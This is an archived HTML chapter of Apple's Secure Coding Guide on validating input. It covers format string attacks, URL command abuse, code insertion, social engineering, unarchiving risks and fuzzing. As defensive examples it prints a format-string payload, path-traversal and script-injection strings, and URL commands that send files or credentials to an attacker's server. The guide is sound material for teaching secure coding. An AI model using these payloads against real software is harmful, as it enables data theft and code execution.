<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
	<title>Secure Coding Guide: Validating Input</title>
	<meta id="Generator" name="Generator" content="Gutenberg"/>
	<meta id="GeneratorVersion" name="GeneratorVersion" content="v132"/>
	<meta http-equiv="content-type" content="text/html;charset=utf-8"/>
	<meta id="Copyright" name="Copyright" content="Copyright 2009 Apple Inc. All Rights Reserved."/>
	<meta id="IndexTitle" name="IndexTitle" content="Validating Input"/>
	<meta id="xcode-display" name="xcode-display" content="render"/>
	<meta id="toc-file" name="toc-file" content="../toc.html"/>
	<meta id="RESOURCES" content="../../../../Resources" />
	
	<link rel="stylesheet" type="text/css" href="../../../../Resources/CSS/frameset_styles.css"/>
	<script language="JavaScript" type="text/javascript" src="../../../../Resources/JavaScript/lib/prototype.js"></script>
	<script language="JavaScript" type="text/javascript" src="../../../../Resources/JavaScript/lib/scriptaculous.js"></script>
	<script language="JavaScript" type="text/javascript" src="../../../../Resources/JavaScript/page.js"></script>
	<script language="JavaScript" type="text/javascript" src="../../../../Resources/JavaScript/pedia.js"></script>
	<!--[if lte IE 6]>
		<style type="text/css">
			/*<![CDATA[*/ 
			html {overflow-x:auto; overflow-y:hidden;  }
			/*]]>*/
		</style>
	<![endif]-->
</head>
<body bgcolor="#ffffff" onload="initialize_page();"><a name="//apple_ref/doc/uid/TP40007246" title="Validating Input"></a>
    <noscript>
    <div id="tocMenu">
        <iframe id="toc_content" name="toc_content" SRC="../toc.html" width="210" height="100%" align="left" frameborder="0">This document set is best viewed in a browser that supports iFrames.</iframe>
    </div>
    </noscript>
    <div id="bodyText">
        <a name="top"></a>
        <div class="hideOnPrint hideInXcode">
        <!-- start of header -->
        <!--#include virtual="/includes/framesetheader" -->
        <!-- end of header -->
        </div>
        
        <!-- start of path -->
<div class="breadcrumb hideOnPrint hideInXcode"><a href="http://developer.apple.com/" target="_top">ADC Home</a> &gt; <a href="../../../../../referencelibrary/index.html#//apple_ref/doc/uid/TP30000943" target="_top">Reference Library</a> &gt; <a href="../../../../index.html#//apple_ref/doc/uid/TP30000440" target="_top">Guides</a> &gt; <a href="../../../index.html#//apple_ref/doc/uid/TP30000440-TP30000434" target="_top">Security</a> &gt; <a href="../index.html" target="_top">Secure Coding Guide</a> &gt; </div><br class="hideInXcode"/><!-- end of path -->
        
        <div class="mini_nav_text" align="left">
        <span class="navButtons">
        <a href="BufferOverflows.html">&lt; Previous Page</a><span style="margin-left: 8px"><a href="RaceConditions.html">Next Page &gt;</a></span>
        </span>
        <span id="showHideTOCUpperSpan">
        <a href="#" onclick="showHideTOC();"><img src="../../../../Resources/Images/show_toc_icon.gif" width="15" height="14" border="0" style="margin-bottom: -2px;" alt="" hideText="Hide TOC" showText="Show TOC" /></a> <a href="#" onclick="showHideTOC();">Hide TOC</a>
        </span>
        </div>
        
        
        <a name="//apple_ref/doc/uid/TP40007246-SW3" title="Validating Input"></a><hr /><H1>Validating Input</H1><p>A major, and growing, source of security vulnerabilities is the failure of programs to validate all <a name="//apple_ref/doc/uid/TP40007246-DontLinkElementID_282"></a><a name="//apple_ref/doc/uid/TP40007246-DontLinkElementID_283"></a>input from outside the program—that is, data provided by users or by other processes. This article describes some of the ways in which unvalidated input can be exploited, and some coding techniques to practice and to avoid.</p>
<!-- This template is being used for both PDF and HTML. -->

    
    <!-- TopicBook.pm uses this template for its miniTOCs, but needs a different title. -->
    <h4>Contents:</h4>
    
    
    <p class="blockquote">
    
        
			
			
				<a href="ValidatingInput.html#//apple_ref/doc/uid/TP40007246-SW4">Risks of Unvalidated Input</a>
				
			<br/>
			
        
			
			
				<a href="ValidatingInput.html#//apple_ref/doc/uid/TP40007246-DontLinkElementID_1">Archived Data</a>
				
			<br/>
			
        
			
			
				<a href="ValidatingInput.html#//apple_ref/doc/uid/TP40007246-SW8">Fuzzing</a>
				
			<br/>
			
        

    </p><br/>

<a name="//apple_ref/doc/uid/TP40007246-SW4" title="Risks of Unvalidated Input"></a><h2>Risks of Unvalidated Input</h2><p>Any time your program accepts input from an uncontrolled source, there is a potential for a user to pass in data that does not conform to your expectations. If you don’t validate the input, it might cause problems ranging from program crashes to allowing an attacker to execute his own code. There are a number of ways an attacker can take advantage of unvalidated input, including through:</p><ul class="ul"><li class="li"><p>Buffer overflows</p></li><li class="li"><p>Format string vulnerabilities</p></li><li class="li"><p>URL commands</p></li><li class="li"><p>Code insertion</p></li><li class="li"><p>Social engineering</p></li></ul><p>Many Apple security updates have been to fix input vulnerabilities, including a couple of vulnerabilities that hackers used to “jailbreak” iPhones. Input vulnerabilities are common, often easily exploitable, but also usually easily remedied.</p><a name="//apple_ref/doc/uid/TP40007246-SW2" title="Causing a Buffer Overflow"></a><h3>Causing a Buffer Overflow</h3><p>If a user can input data and you don’t check its size and truncate it appropriately, an attacker can use the input field to cause a buffer overflow. For example, if you ask a user to input the name of an existing file, you might reserve a buffer of 256 bytes for the filename, with the expectation that they could not have a file with a longer name than that. However, if you don’t check the length of the string the user actually passes to you, some hacker is sure to try a longer string than that, resulting in a buffer overflow. Once they’ve established that they can cause a buffer overflow, they’ll attempt to craft a long input for the field that results in an exploit of some sort (see <span class="content_text"><a href="BufferOverflows.html#//apple_ref/doc/uid/TP40002577-SW1">“Avoiding Buffer Overflows”</a></span>). Simply using the wrong string function to handle an input string can have the same result (see <span class="content_text"><a href="BufferOverflows.html#//apple_ref/doc/uid/TP40002577-SW10">“String Handling”</a></span>).</p><a name="//apple_ref/doc/uid/TP40007246-SW1" title="Format String Attacks"></a><h3>Format String Attacks</h3><p><a name="//apple_ref/doc/uid/TP40007246-DontLinkElementID_284"></a>If you are taking input from a user or other untrusted source and displaying it, you need to be careful that your display routines do not process format strings received from the untrusted source. For example, in the following code the syslog standard C library function is used to write a received HTTP request to the system log. Because the <code>syslog</code> function processes format strings, it will process any format strings included in the input packet: </p><div class="codesample"><table><tr><td scope="row"><pre>/* receiving http packet */<span></span></pre></td></tr><tr><td scope="row"><pre>int size = recv(fd, pktBuf, sizeof(pktBuf), 0);<span></span></pre></td></tr><tr><td scope="row"><pre>if (size) {<span></span></pre></td></tr><tr><td scope="row"><pre>syslog(LOG_INFO, "Received new HTTP request!");<span></span></pre></td></tr><tr><td scope="row"><pre>syslog(LOG_INFO, pktBuf);<span></span></pre></td></tr><tr><td scope="row"><pre>}<span></span></pre></td></tr></table></div><p>Many format strings can cause problems for applications. For example, suppose an attacker passes the following string in the input packet:</p><div class="codesample"><table><tr><td scope="row"><pre>"AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%n"<span></span></pre></td></tr></table></div><p>Assuming that the format string itself is stored on the stack, this string retrieves eight items from the stack. Depending on the nature of the stack and memory used by the device, this might effectively moving the stack pointer back to the beginning of the format string. Then the <code>%n</code> token could cause the print function to write the formatted bytes to the memory location <code>AAAA</code>, or <code>0x41414141</code>. That in itself will cause a crash the next time the system has to access that memory location. By using a string carefully crafted for a specific device and operating system, the attacker can write arbitrary data to any location. See the manual page for <code>printf(3)</code> for a full description of format string syntax.</p><p>To prevent format string attacks, it is only necessary to make sure that no print function call that accepts input from an untrusted source processes format strings in the input data. To do so, you need to include your own format string in each such function call. For example, the call</p><p><code>printf(buffer)</code></p><p>may be subject to attack, but the call</p><p><code>printf("%s", buffer)</code></p><p>is not. In the second case, all characters in the buffer parameter—including percent signs (<code>%</code>)—are printed out rather than being interpreted as formatting tokens.</p><p>This situation can be made more complicated when a string is accidentally formatted more than once. In the following example, the <code>informativeTextWithFormat</code> argument of the <code>NSAlert</code> method <code>alertWithMessageText:defaultButton:alternateButton:otherButton:informativeTextWithFormat:</code> calls the <code>NSString</code> method <code>stringWithFormat:GetLocalizedString</code> rather than simply formatting the message string itself. As a result, the string is formatted twice, and the data from the imported certificate is used as part of the format string for the <code>NSAlert</code> method:</p><div class="codesample"><table><tr><td scope="row"><pre>alert = [NSAlert alertWithMessageText:"Certificate Import Succeeded"<span></span></pre></td></tr><tr><td scope="row"><pre>defaultButton:"OK"<span></span></pre></td></tr><tr><td scope="row"><pre>alternateButton:nil<span></span></pre></td></tr><tr><td scope="row"><pre>otherButton:nil<span></span></pre></td></tr><tr><td scope="row"><pre>informativeTextWithFormat:[NSString stringWithFormat:<span></span></pre></td></tr><tr><td scope="row"><pre>       "The imported certificate \"%@\" has been selected in the certificate pop-up.",<span></span></pre></td></tr><tr><td scope="row"><pre>       [selectedCert identifier]]];<span></span></pre></td></tr><tr><td scope="row"><pre> <span></span></pre></td></tr><tr><td scope="row"><pre>[alert setAlertStyle:NSInformationalAlertStyle];<span></span></pre></td></tr><tr><td scope="row"><pre>[alert runModal];<span></span></pre></td></tr></table></div><p>Instead, the string should be formatted only once, as follows:</p><div class="codesample"><table><tr><td scope="row"><pre>informativeTextWithFormat:"The imported certificate \"%@\" has been selected in the certificate pop-up.",<span></span></pre></td></tr><tr><td scope="row"><pre>       [selectedCert identifier]]];<span></span></pre></td></tr></table></div><p>The following commonly-used functions and methods are subject to format-string attacks:</p><ul class="spaceabove"><li class="li"><p>Standard C</p><ul class="nested"><li class="nested li"><p><code>printf</code> and other functions listed on the <code>printf(3)</code> manual page</p></li><li class="nested li"><p><code>scanf</code> and other functions listed on the <code>scanf(3)</code> manual page</p></li><li class="nested li"><p><code>syslog</code> and <code>vsyslog</code></p></li></ul></li><li class="li"><p>Carbon</p><ul class="nested"><li class="nested li"><p><code>CFStringCreateWithFormat</code></p></li><li class="nested li"><p><code>CFStringCreateWithFormatAndArguments</code></p></li><li class="nested li"><p><code>CFStringAppendFormat</code></p></li><li class="nested li"><p><code>AEBuildDesc</code></p></li><li class="nested li"><p><code>AEBuildParameters</code></p></li><li class="nested li"><p><code>AEBuildAppleEvent</code></p></li></ul></li><li class="li"><p>Cocoa</p><ul class="nested"><li class="nested li"><p><code>[NSString stringWithFormat:]</code> and other <code>NSString</code> methods that take formatted strings as arguments</p></li><li class="nested li"><p><code>[NSString initWithFormat:]</code> and other <code>NSString</code> methods that take format strings as arguments</p></li><li class="nested li"><p><code>[NSMutableString appendFormat:]</code></p></li><li class="nested li"><p><code>[NSAlert alertWithMessageText:defaultButton:alternateButton:otherButton:informativeTextWithFormat:]</code></p></li><li class="nested li"><p><code>[NSPredicate predicateWithFormat:]</code> and <code>[NSPredicate predicateWithFormat:arguments:]</code></p></li><li class="nested li"><p><code>[NSException raise:format:]</code> and <code>[NSException raise:format:arguments:]</code></p></li><li class="nested li"><p><code>NSRunAlertPanel</code> and other Application Kit functions that create or return panels or sheets</p></li></ul></li></ul><a name="//apple_ref/doc/uid/TP40007246-SW5" title="URL Commands"></a><h3>URL Commands</h3><p><a name="//apple_ref/doc/uid/TP40007246-DontLinkElementID_285"></a>If your application has registered a URL scheme, you have to be careful about how you process commands sent to your application through the URL string. Whether you make the commands public or not, hackers will try sending commands to your application. If, for example, you provide a link or links to launch your application from your web site, hackers will look to see what commands you’re sending and will try every variation on those commands they can think of. You must be prepared to handle, or to filter out, any commands that <em>can</em> be sent to your application, not only those commands that you would <em>like</em> to receive. For example, if you accept a command that causes your application to send credentials back to your web server, don’t make the function handler general enough so that an attacker can substitute the URL of their own web server. Here are some examples of the sorts of commands that you should <em>not</em> accept:</p><ul class="spaceabove"><li class="li"><p>myapp://cmd/run?program=/path/to/program/to/run</p></li><li class="li"><p>myapp://cmd/set_preference?use_ssl=false</p></li><li class="li"><p>myapp://cmd/sendfile?to=evil@attacker.com&amp;file=some/data/file</p></li><li class="li"><p>myapp://cmd/delete?data_to_delete=my_document_ive_been_working_on</p></li><li class="li"><p>myapp://cmd/login_to?server_to_send_credentials=some.malicious.webserver.com</p></li></ul><p>In general, don’t accept commands that include arbitrary URLs or complete pathnames.</p><p>If you accept text or other data in a URL command that you subsequently include in a function or method call, you could be subject to a format string attack (see <span class="content_text"><a href="ValidatingInput.html#//apple_ref/doc/uid/TP40007246-SW1">“Format String Attacks”</a></span>) or a buffer overflow attack (see <span class="content_text"><a href="ValidatingInput.html#//apple_ref/doc/uid/TP40007246-SW2">“Causing a Buffer Overflow”</a></span>). If you accept pathnames, be careful to guard against strings that might redirect a call to another directory; for example:</p><p><code>myapp://use_template?template=/../../../../../../../../some/other/file</code></p><a name="//apple_ref/doc/uid/TP40007246-SW6" title="Code Insertion"></a><h3>Code Insertion</h3><p><a name="//apple_ref/doc/uid/TP40007246-DontLinkElementID_286"></a>Unvalidated URL commands and text strings sometimes allow an attacker to insert code into a program, which the program then executes. For example, if your application processes HTML and Javascript when displaying text, and displays strings received through a URL command, an attacker could send a command something like this:</p><div class="codesample"><table><tr><td scope="row"><pre>myapp://cmd/adduser='>">&lt;script><em>javascript to run goes here</em>&lt;/script><span></span></pre></td></tr></table></div><p>Similarly, HTML and other scripting languages can be inserted through URLs, text fields, and other data inputs, such as command lines and even graphics or audio files. You should either not execute scripts in data from an untrusted source, or you should validate all such data to make sure it conforms to your expectations for input. Never assume that the data you receive is well formed and valid; hackers and malicious users will try every sort of malformed data they can think of to see what effect it has on your program. </p><a name="//apple_ref/doc/uid/TP40007246-SW7" title="Social Engineering"></a><h3>Social Engineering</h3><p><a name="//apple_ref/doc/uid/TP40007246-DontLinkElementID_287"></a>Social engineering—essentially tricking the user—can be used with unvalidated input vulnerabilities to turn a minor annoyance into a major problem. For example, if your program accepts a URL command to delete a file, but first displays a dialog requesting permission from the user, you might be able to send a long-enough string to scroll the name of the file to be deleted past the end of the dialog. You could trick the user into thinking he was deleting something innocuous, such as unneeded cached data. For example:</p><div class="codesample"><table><tr><td scope="row"><pre>myapp://cmd/delete?file=cached data that is slowing down your system.,realfile<span></span></pre></td></tr></table></div><p>The user then might see a dialog with the text “Are you sure you want to delete cached data that is slowing down your system.” The name of the real file, in this scenario, is out of sight below the bottom of the dialog window. When the user clicks the “OK” button, however, the user’s real data is deleted.</p><p>Other examples of social engineering attacks include tricking a user into clicking on a link in a malicious web site or following a malicious URL.</p><a name="//apple_ref/doc/uid/TP40007246-DontLinkElementID_1" title="Archived Data"></a><h2>Archived Data</h2><p>Archiving data refers to converting objects and values into an architecture-independent stream of bytes that preserves the identity of and the relationships between the objects and values. Archives are used for writing data to a file, transmitting data between processes or across a network, or performing other types of data storage or exchange. Archiving is described briefly in this section in order to explain the security concerns associated with the process of reading archived data. For details about archiving, see <em><a href="../../../../Cocoa/Conceptual/Archiving/index.html#//apple_ref/doc/uid/10000047i" target="_top">Archives and Serializations Programming Guide for Cocoa</a></em>. </p><a name="//apple_ref/doc/uid/TP40007246-DontLinkElementID_2" title="Archiving and Unarchiving Data In Mac&Acirc;&nbsp;OS&Acirc;&nbsp;X"></a><h3>Archiving and Unarchiving Data In Mac OS X</h3><p>In Cocoa, you use a coder object to create and read from an archive, where a coder object is an instance of a concrete subclass of the abstract class <code>NSCoder</code>. <code>NSCoder</code> declares an extensive interface for taking the information stored in an object and putting it into a format suitable for archiving. <code>NSCoder</code> also declares the interface for reversing the process, taking the information stored in a byte stream and converting it back into an object. </p><p>Mac OS X provides several concrete subclasses of <code>NSCoder</code> for developers’ use. Most commonly used are <code>NSKeyedArchiver</code> and <code>NSKeyedUnarchiver</code>. The easiest way to use these classes is to call a convenience class method that instantiates the class and initializes the coder object for you, such as <code><a href="../../../../Cocoa/Reference/Foundation/Classes/NSKeyedArchiver_Class/Reference/Reference.html#//apple_ref/occ/clm/NSKeyedArchiver/archivedDataWithRootObject:" target="_top">archivedDataWithRootObject:</a></code> or <code><a href="../../../../Cocoa/Reference/Foundation/Classes/NSKeyedUnarchiver_Class/Reference/Reference.html#//apple_ref/occ/clm/NSKeyedUnarchiver/unarchiveObjectWithData:" target="_top">unarchiveObjectWithData:</a></code>. The coder then sends an <code>encodeWithCoder:</code> message to your object if it’s creating an archive or an <code>initWithCoder:</code> message if it’s reading an archive. You are responsible for implementing these methods—which do the actual encoding or decoding of your object’s instance variables—for each object that supports archiving. The <code>NSKeyedArchiver</code> and <code>NSKeyedUnarchiver</code> classes implement methods that your <code>encodeWithCoder:</code> and <code>initWithCoder:</code> methods can call to code or decode values.</p><p>For example, suppose you have a data object called <code>myData</code> and you want to archive the data in that object. Your <code>myData</code> object would have to implement the <code>encodeWithCoder:</code> method to encode the instance variables in the <code>myData</code> object. A typical execution sequence would proceed like this:</p><ol class="ol"><li class="li"><p>Your application calls the <code>archivedDataWithRootObject:</code> method, passing it a pointer to your <code>myData</code> object.</p></li><li class="li"><p>The <code>archivedDataWithRootObject:</code> method initiates and initializes an <code>NSKeyedArchiver</code> object, which sends an <code>encodeWithCoder:</code> message to your <code>myData</code> object. The <code>encodeWithCoder:</code> message includes a pointer to the <code>NSKeyedArchiver</code> object that sent the message.</p></li><li class="li"><p>Your <code>myData</code> object executes its <code>encodeWithCoder:</code> method.</p></li><li class="li"><p>The <code>encodeWithCoder:</code> method encodes the instance variables of your <code>myData</code> object by calling methods provided by the <code>NSKeyedArchiver</code> object—for example, <code>encodeObject:forKey:</code> or <code>encodeFloat:forKey:</code>.</p></li><li class="li"><p>When your <code>encodeWithCoder:</code> method is finished encoding your object’s data, it returns control to the <code>archivedDataWithRootObject:</code> method.</p></li><li class="li"><p>The <code>archivedDataWithRootObject:</code> method completes, returning to your application a pointer to the archived data.</p></li></ol><p>To unarchive the data, your application follows essentially the same steps, except that you call the <code>unarchiveObjectWithData:</code> method, which calls your data object’s <code>initWithCoder:</code> method. For code samples illustrating these steps, see <em><a href="../../../../Cocoa/Conceptual/Archiving/index.html#//apple_ref/doc/uid/10000047i" target="_top">Archives and Serializations Programming Guide for Cocoa</a></em> and the <em><a href="../../../../../samplecode/iSpend/index.html#//apple_ref/doc/uid/DTS10003625" target="_top">iSpend</a></em> sample application.</p><a name="//apple_ref/doc/uid/TP40007246-DontLinkElementID_3" title="The Security Risks In Unarchiving Data"></a><h3>The Security Risks In Unarchiving Data</h3><p>Archived data can be stored in memory or in a file on disk. Because an application must know the type of data stored in an archive in order to unarchive it, developers typically assume that the values being decoded are the same size and data type as the values they originally coded. However, when the data is stored in an insecure manner before being unarchived, this is not a safe assumption. If the archived data is not stored securely, it is possible for an attacker to modify the data before the application unarchives it. If your <code>initWithCoder:</code> method does not carefully validate all the data it’s decoding to make sure it is well formed and does not exceed the memory space reserved for it, then by carefully crafting a corrupted archive, an attacker can cause a buffer overflow or trigger another vulnerability and possibly seize control of the system. In addition, some objects return a different object during unarchiving (see the <code>NSKeyedUnarchiver</code> method <code><a href="../../../../Cocoa/Reference/Foundation/Classes/NSKeyedUnarchiver_Class/Reference/Reference.html#//apple_ref/occ/instm/NSObject/unarchiver:didDecodeObject:" target="_top">unarchiver:didDecodeObject:</a></code>) or when they receive the message <code><a href="../../../../Cocoa/Reference/Foundation/Classes/NSObject_Class/Reference/Reference.html#//apple_ref/occ/instm/NSObject/awakeAfterUsingCoder:" target="_top">awakeAfterUsingCoder:</a></code>. <code>NSImage</code> is one example of such a class—it may register itself for a name when unarchived, potentially taking the place of an image the application uses. An attacker might be able to take advantage of this to insert a maliciously corrupt image file into an application.</p><p>It’s worth keeping in mind that, even if you write completely safe code, there might still be security vulnerabilities in libraries called by your code. Specifically, the <code>initWithCoder:</code> methods of the superclasses of your classes are also involved in unarchiving. Therefore, to be completely sure of the safety of unarchived data, you should be careful to store the data in a secure location.</p><p>Note that nib files are archives, and these cautions apply equally to them. A nib file loaded from a signed application bundle should be trustable, but a nib file stored in an insecure location is not.</p><p>See <span class="content_text"><a href="ValidatingInput.html#//apple_ref/doc/uid/TP40007246-SW4">“Risks of Unvalidated Input”</a></span> for more information on the risks of reading unvalidated input, <span class="content_text"><a href="RaceConditions.html#//apple_ref/doc/uid/TP40002585-SW10">“Secure File Operations”</a></span> for techniques you can use to keep your archive files secure, and the other sections in this chapter for details on validating input. </p><a name="//apple_ref/doc/uid/TP40007246-SW8" title="Fuzzing"></a><h2>Fuzzing</h2><p><a name="//apple_ref/doc/uid/TP40007246-DontLinkElementID_288"></a>Fuzzing, or fuzz testing, is the technique of passing random data to a program input to see what happens. If the program crashes or otherwise misbehaves, that’s an indication of a potential vulnerability that might be exploitable. Fuzzing is a favorite tool of hackers who are looking for buffer overflows and the other types of vulnerabilities discussed in this article. Because it will be employed by hackers against your program, you should use it first, so you can close any vulnerabilities before they do. Although you can never prove that your program is completely free of vulnerabilities, you can at least get rid of any that are easy to find this way. In this case, the developer’s job is much easier than that of the hacker. Whereas the hacker has to not only find input fields that might be vulnerable, but also must determine the exact nature of the vulnerability and then craft an attack that exploits it, you need only find the vulnerability, then look at the source code to determine how to close it. You don’t need to prove that the problem is exploitable—just assume that someone will find a way to exploit it, and fix it before they get an opportunity to try.</p><p>Fuzzing is best done with scripts or short programs that randomly vary the input passed to a program. Depending on the type of input you’re testing—text field, URL, data file, and so forth—you can try HTML, javascript, extra long strings, normally illegal characters, and so forth. If the program crashes or does anything unexpected, you need to examine the source code that handles that input to see what the problem is, and fix it.<a name="//apple_ref/doc/uid/TP40007246-DontLinkElementID_289"></a><a name="//apple_ref/doc/uid/TP40007246-DontLinkElementID_290"></a></p>

        <br/><br/> 

        <div class="mini_nav_text" align="left">
        <span class="navButtons">
        <a href="BufferOverflows.html">&lt; Previous Page</a><span style="margin-left: 8px"><a href="RaceConditions.html">Next Page &gt;</a></span>
        </span>
        <span id="showHideTOCLowerSpan">
        <a href="#" onclick="showHideTOC();"><img src="../../../../Resources/Images/show_toc_icon.gif" width="15" height="14" border="0" style="margin-bottom: -2px;" alt="" /></a> <a href="#" onclick="showHideTOC();">Hide TOC</a>
        </span>
        </div>

        <br/><hr /><div align="center"><p class="content_text" lang="en" dir="ltr"> <!--#if expr="0=1" -->&#x00a9; 2008 Apple Inc. All Rights Reserved. &#40;<!--#endif -->Last updated: 2008-05-23<!--#if expr="0=1" -->&#041;<!--#endif --></p></div>

        
        <div class="hideOnPrint hideInXcode">
        <!-- start of footer -->
        	<table width="100%" border="0" cellpadding="0" cellspacing="0">
		<tr>
			<td><div style="width: 100%; height: 1px; background-color: #919699; margin-top: 5px; margin-bottom: 15px"></div></td>
		</tr>
		<tr>
			<td align="center"><br/>
				<table border="0" cellpadding="0" cellspacing="0" class="graybox">
					<tr>
						<th>Did this document help you?</th>
					</tr>
					<tr>
						<td>
						    <div style="margin-bottom: 8px"><a href="http://developer.apple.com/feedback/?v=1&url=/documentation/Security/Conceptual/SecureCodingGuide/Articles/ValidatingInput.html%3Fid%3DTP40002415-2.0&media=dvd" target=_new>Yes</a>:  Tell us what works for you.</div>
							<div style="margin-bottom: 8px"><a href="http://developer.apple.com/feedback/?v=2&url=/documentation/Security/Conceptual/SecureCodingGuide/Articles/ValidatingInput.html%3Fid%3DTP40002415-2.0&media=dvd" target=_new>It&#8217;s good, but:</a> Report typos, inaccuracies, and so forth.</div>
							<div><a href="http://developer.apple.com/feedback/?v=3&url=/documentation/Security/Conceptual/SecureCodingGuide/Articles/ValidatingInput.html%3Fid%3DTP40002415-2.0&media=dvd" target=_new>It wasn&#8217;t helpful</a>: Tell us what would have helped.</div>
						</td>
					</tr>
				</table>
			</td>
		</tr>
	</table>

        <!--#include virtual="/includes/framesetfooter" -->
        <!-- end of footer -->
        </div>
    </div>
</body>
</html>
